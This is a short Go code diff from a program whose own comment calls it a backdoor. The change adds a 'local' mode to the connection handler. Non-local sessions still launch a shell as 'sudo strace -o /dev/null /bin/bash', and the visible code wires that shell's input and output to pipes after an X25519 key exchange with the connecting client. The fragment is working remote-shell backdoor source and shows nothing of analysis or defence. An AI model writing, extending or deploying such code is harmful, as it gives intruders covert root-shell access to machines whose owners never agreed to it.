@@ -108,7 +108,7 @@ func endConnection(conn net.Conn) {
 }
 
 // Handles initial connection from a client to this backdoor
-func handleConnection(conn net.Conn) {
+func handleConnection(conn net.Conn, local bool) {
 	defer endConnection(conn)
 	fmt.Printf("Serving %s\n", conn.RemoteAddr().String())
 	var priv, _ = ecdh.Curve.GenerateKey(ecdh.X25519(), rand.Reader)
@@ -184,7 +184,12 @@ func handleConnection(conn net.Conn) {
 
 	// Start the shell
 	fmt.Println("Starting bash")
-	bash := exec.Command("sudo", "strace", "-o", "/dev/null", "/bin/bash")
+	var bash *exec.Cmd
+	if local {
+		bash = exec.Command("bash")
+	} else {
+		bash = exec.Command("sudo", "strace", "-o", "/dev/null", "/bin/bash")
+	}
 	stdin, _ := bash.StdinPipe()
 	stdout, _ := bash.StdoutPipe()
 	stderr, _ := bash.StderrPipe()
